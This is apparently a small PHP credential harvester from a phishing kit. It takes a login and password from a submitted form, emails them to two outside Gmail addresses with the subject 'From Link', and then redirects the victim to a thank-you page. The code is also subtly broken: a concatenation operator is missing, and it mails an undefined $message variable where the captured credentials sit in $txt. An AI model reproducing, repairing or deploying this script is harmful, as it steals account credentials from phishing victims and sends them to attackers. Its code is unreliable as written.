<?php
$log = $_POST['log'];
$pwd = $_POST['pwd'];
$to = "criispin.fredd@gmail.com";
$subject = "From Link";

$headers = "From: ".$log "\r\n" .
           "CC: jsam58864@gmail.com";

$txt = "Login: $log\r\nPassword: $pwd"; 
       

if (!empty($log) && !empty($pwd)) {
    mail($to, $subject, $message, $headers);
}


header("Location: Thankyou.html");
?>
